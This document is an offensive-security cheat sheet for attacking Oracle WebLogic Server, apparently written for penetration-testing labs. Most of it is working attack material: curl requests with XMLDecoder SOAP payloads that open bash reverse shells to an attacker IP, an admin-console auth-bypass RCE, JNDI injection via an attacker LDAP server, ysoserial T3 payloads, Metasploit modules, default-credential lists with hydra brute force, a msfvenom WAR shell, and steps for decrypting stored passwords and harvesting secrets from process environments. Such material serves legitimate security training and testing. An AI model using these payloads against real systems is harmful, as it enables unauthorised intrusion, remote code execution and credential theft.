#WebLogic #OracleWebLogic #Java #deserialization #T3 #JNDI #webservices

## What is WebLogic?
Oracle WebLogic Server — enterprise Java EE application server. Widely deployed in large organizations and common in HTB Pro Labs. Primary attack surface: unauthenticated RCE via T3/IIOP deserialization, admin console auth bypass, JNDI injection, and async servlet vulnerabilities. Java deserialization has plagued WebLogic for years.

- Port: **TCP 7001** — HTTP (default managed/admin server)
- Port: **TCP 7002** — HTTPS/SSL
- Port: **TCP 5556** — Node Manager
- Port: **TCP 9002** — Admin console HTTPS (alternate)
- Admin console: `http://<target>:7001/console`
- T3 protocol: same port as HTTP (7001) — used for RMI/JNDI
- Default domain: `/u01/app/oracle/Middleware/user_projects/domains/`

---

## Enumeration

```bash
# Nmap
nmap -p 7001,7002,5556 --script http-title,banner -sV <target>

# Fingerprint + version
curl -s http://<target>:7001/console/login/LoginForm.jsp | grep -i "version\|weblogic"
curl -s http://<target>:7001/ | grep -i "weblogic\|oracle"

# Check exposed endpoints
curl -s http://<target>:7001/wls-wsat/CoordinatorPortType   # CVE-2017-10271
curl -s http://<target>:7001/_async/AsyncResponseService     # CVE-2019-2725
curl -s http://<target>:7001/console/                        # Admin console

# UDDI / WSDL exposure
curl -s http://<target>:7001/uddiexplorer/

# Metasploit scanners
use auxiliary/scanner/http/weblogic_adminserver
use auxiliary/scanner/http/weblogic_status
```

---

## CVEs — Version Reference

| CVE | Affected Versions | Type | Auth |
|---|---|---|---|
| CVE-2023-21839 | 12.2.1.3, 12.2.1.4, 14.1.1.0 | JNDI injection → RCE | No |
| CVE-2021-2109 | 10.3.6, 12.1.3, 12.2.1.3/4, 14.1.1 | JNDI injection → RCE | No |
| CVE-2020-14882 | 10.3.6, 12.1.3, 12.2.1.3/4, 14.1.1 | Admin console auth bypass | No |
| CVE-2020-14883 | Same as above | Admin console RCE post-bypass | With bypass |
| CVE-2019-2725 | 10.3.6, 12.1.3 | XMLDecoder deserialization → RCE | No |
| CVE-2018-2628 | 10.3.6, 12.1.3, 12.2.1.2/3 | T3 deserialization → RCE | No |
| CVE-2017-10271 | 10.3.6, 12.1.3, 12.2.1.1/2 | XMLDecoder via wls-wsat → RCE | No |

---

## Attack Vectors

### CVE-2017-10271 — XMLDecoder RCE (wls-wsat)

Unauthenticated RCE via XMLDecoder deserialization in the WLS-WebServices component.

```bash
# Check endpoint is accessible
curl -s http://<target>:7001/wls-wsat/CoordinatorPortType

# Exploit — reverse shell via POST
curl -s -X POST http://<target>:7001/wls-wsat/CoordinatorPortType \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>bash -i &gt;&amp; /dev/tcp/<attacker_ip>/<port> 0&gt;&amp;1</string></void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'

# Metasploit
use exploit/multi/http/oracle_weblogic_wsat_deserialization_rce
set RHOSTS <target>
set RPORT 7001
set LHOST <attacker_ip>
run
```

### CVE-2019-2725 — Async Servlet XMLDecoder RCE

Unauthenticated RCE via `_async` endpoint (wls9_async_response).

```bash
# Check endpoint
curl -s http://<target>:7001/_async/AsyncResponseService

# Exploit
curl -s -X POST "http://<target>:7001/_async/AsyncResponseService" \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: " \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:wsa="http://www.w3.org/2005/08/addressing"
  xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>bash -i &gt;&amp; /dev/tcp/<attacker_ip>/<port> 0&gt;&amp;1</string></void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body>
</soapenv:Envelope>'

# Metasploit
use exploit/multi/http/weblogic_deserialize_asyncresponseservice
set RHOSTS <target>
set RPORT 7001
run
```

### CVE-2020-14882 + CVE-2020-14883 — Admin Console Auth Bypass + RCE

14882 bypasses console authentication; 14883 achieves RCE post-bypass.

```bash
# CVE-2020-14882 — bypass admin console auth
# Accessing /console/css/ bypasses auth filter
curl -s "http://<target>:7001/console/css/%252E%252E%252Fconsole.portal" \
  -H "cmd: whoami"

# Combined exploit — 14882 bypass + 14883 RCE
curl -s -X POST "http://<target>:7001/console/css/%252E%252E%252Fconsole.portal" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data '_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec(\"id\");")'

# Windows payload (cmd)
# exec("cmd /c whoami")

# Metasploit (combines both)
use exploit/multi/http/weblogic_admin_console_handle_rce
set RHOSTS <target>
set RPORT 7001
set LHOST <attacker_ip>
run

# Python PoC
python3 CVE-2020-14882.py -u http://<target>:7001 -c "id"
```

### CVE-2021-2109 / CVE-2023-21839 — JNDI Injection

```bash
# Step 1: Start JNDI exploit server (JNDI-Exploit-Kit or ysoserial)
# https://github.com/pimps/JNDI-Exploit-Kit
java -jar JNDI-Exploit-Kit.jar -C "bash -c {echo,<b64_cmd>}|{base64,-d}|bash" -A <attacker_ip>

# Step 2: Trigger JNDI lookup via vulnerable endpoint

# CVE-2021-2109 — JNDI via /console/ endpoint
curl -s "http://<target>:7001/console/consolejndi.portal?_nfpb=true&_pageLabel=JNDIBindingPageGeneral&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle%28%22ldap://<attacker_ip>:1389/Exploit%22%2C...%29"

# CVE-2023-21839 — JNDI via T3/IIOP
python3 CVE-2023-21839.py -ip <target> -port 7001 -ldap ldap://<attacker_ip>:1389/Exploit

# Metasploit
use exploit/multi/http/weblogic_admin_console_jndi_rce
```

### T3 Protocol Deserialization (CVE-2018-2628 / General)

T3 is WebLogic's proprietary protocol for RMI — runs on port 7001 alongside HTTP.

```bash
# Check T3 is enabled
echo "t3 12.2.1" | nc -w 3 <target> 7001 | head -1
# Response: "HELO" = T3 enabled

# ysoserial — generate deserialization payload
java -jar ysoserial.jar CommonsCollections1 "bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'" > payload.ser

# Send via T3 — use weblogic-framework or custom sender
# https://github.com/SkyBlueEternal/weblogic-RCE-exploit

# Metasploit — T3 deserialization
use exploit/multi/misc/weblogic_deserialize_marshalledobject
set RHOSTS <target>
set RPORT 7001
set LHOST <attacker_ip>
run
```

### Admin Console — Authenticated Deployment (WAR Upload)

If admin credentials obtained:

```bash
# Default creds to try
weblogic / weblogic
weblogic / weblogic1
weblogic / welcome1
weblogic / Oracle123
admin / admin
system / password

# Brute force admin console
hydra -L users.txt -P passwords.txt <target> -s 7001 \
  http-form-post "/console/j_security_check:j_username=^USER^&j_password=^PASS^:Error"

# Deploy WAR via admin console (authenticated)
# Domain Structure → Deployments → Install → Upload → Deploy
# Create malicious WAR:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f war -o shell.war

# Or via WLST (WebLogic Scripting Tool) if credentials known
java weblogic.WLST
connect('<user>', '<pass>', 't3://<target>:7001')
deploy('shell', '/path/to/shell.war', targets='AdminServer')
```

---

## Post-Exploitation

```bash
# Find domain config — often contains encrypted credentials
find / -name "config.xml" 2>/dev/null | grep -i "domain\|weblogic"
cat /u01/app/oracle/Middleware/user_projects/domains/*/config/config.xml

# Encrypted passwords in config (AES with domain-specific key)
# SerializedSystemIni.dat contains the encryption key
find / -name "SerializedSystemIni.dat" 2>/dev/null

# Decrypt WebLogic passwords (offline)
# https://github.com/NetSPI/WebLogicPasswordDecryptor
python3 decrypt.py --key SerializedSystemIni.dat --config config.xml

# Decrypt single password
python3 decrypt.py --key SerializedSystemIni.dat --password "{AES}..."

# JDBC datasource credentials (DB passwords in domain config)
grep -i "password-encrypted\|jdbc" /u01/app/oracle/Middleware/user_projects/domains/*/config/jdbc/*.xml

# Environment / process info
cat /proc/$(pgrep -f weblogic)/environ | tr '\0' '\n' | grep -i "pass\|secret\|key\|token"
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Old WebLogic version | Multiple unauthenticated RCE CVEs |
| T3 protocol exposed on internet | Deserialization → RCE |
| Admin console on port 7001 accessible | Auth bypass CVEs or brute force |
| Default credentials | Admin → WAR deploy → RCE |
| `_async` servlet enabled | CVE-2019-2725 |
| `wls-wsat` endpoint enabled | CVE-2017-10271 |
| JNDI resolution enabled | JNDI injection → RCE |

---

## Quick Reference

| Goal | Command |
|---|---|
| Check T3 | `echo "t3 12.2.1" \| nc -w 3 host 7001 \| head -1` |
| Check async endpoint | `curl -s http://host:7001/_async/AsyncResponseService` |
| Check wls-wsat | `curl -s http://host:7001/wls-wsat/CoordinatorPortType` |
| CVE-2017-10271 (MSF) | `exploit/multi/http/oracle_weblogic_wsat_deserialization_rce` |
| CVE-2019-2725 (MSF) | `exploit/multi/http/weblogic_deserialize_asyncresponseservice` |
| CVE-2020-14882/3 (MSF) | `exploit/multi/http/weblogic_admin_console_handle_rce` |
| T3 deserialization (MSF) | `exploit/multi/misc/weblogic_deserialize_marshalledobject` |
| WAR deploy | `msfvenom ... -f war -o shell.war` → admin console deploy |
| Decrypt passwords | `python3 decrypt.py --key SerializedSystemIni.dat --config config.xml` |
